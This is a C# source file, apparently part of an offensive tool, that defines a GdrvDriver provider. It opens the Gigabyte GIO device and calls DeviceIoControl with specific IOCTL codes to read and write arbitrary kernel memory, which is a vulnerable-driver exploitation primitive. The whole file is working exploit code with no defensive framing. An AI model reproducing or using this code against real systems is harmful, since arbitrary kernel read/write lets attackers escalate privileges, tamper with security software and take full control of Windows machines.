using System;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;

public class GdrvDriver : IProvider
{
	private const string DeviceName = "\\\\.\\GIO";
	private const uint IOCTL_READ = 0xC3502808;
	private const uint IOCTL_WRITE = 0xC3502804;
	private SafeFileHandle _handle;

	[StructLayout(LayoutKind.Sequential)]
	private struct GDRV_MEMORY_ACCESS
	{
		public ulong Address;
		public ulong Value;
	}
	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool DeviceIoControl(
	SafeFileHandle hDevice,
	uint dwIoControlCode,
	ref GDRV_MEMORY_ACCESS lpInBuffer,
	int nInBufferSize,
	[Out] byte[] lpOutBuffer,
	int nOutBufferSize,
	ref int lpBytesReturned,
	IntPtr lpOverlapped);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool DeviceIoControl(
		SafeFileHandle hDevice,
		uint dwIoControlCode,
		ref GDRV_MEMORY_ACCESS lpInBuffer,
		int nInBufferSize,
		IntPtr lpOutBuffer,
		int nOutBufferSize,
		ref int lpBytesReturned,
		IntPtr lpOverlapped);

	public bool Open()
	{
		_handle = NativeMethods.CreateFile(DeviceName, FileAccess.ReadWrite,
			FileShare.ReadWrite, IntPtr.Zero, FileMode.Open, 0, IntPtr.Zero);
		return !_handle.IsInvalid;
	}

	public void Close()
	{
		_handle?.Dispose();
	}

	public bool ReadKernelMemory(ulong address, byte[] buffer, int size)
	{
		GDRV_MEMORY_ACCESS input = new GDRV_MEMORY_ACCESS { Address = address };
		int bytesReturned = 0;
		return DeviceIoControl(_handle, IOCTL_READ,
			ref input, Marshal.SizeOf<GDRV_MEMORY_ACCESS>(),
			buffer, size, ref bytesReturned, IntPtr.Zero);
	}

	public bool WriteKernelMemory(ulong address, byte[] data, int size)
	{

		if (data.Length < 8)
		{
			Console.WriteLine("[-] GDRV can only write 8 bytes at a time");
			return false;
		}

		GDRV_MEMORY_ACCESS input = new GDRV_MEMORY_ACCESS
		{
			Address = address,
			Value = BitConverter.ToUInt64(data, 0)
		};

		int bytesReturned = 0;
		return DeviceIoControl(_handle, IOCTL_WRITE,
			ref input, Marshal.SizeOf<GDRV_MEMORY_ACCESS>(),
			IntPtr.Zero, 0, ref bytesReturned, IntPtr.Zero);
	}
}
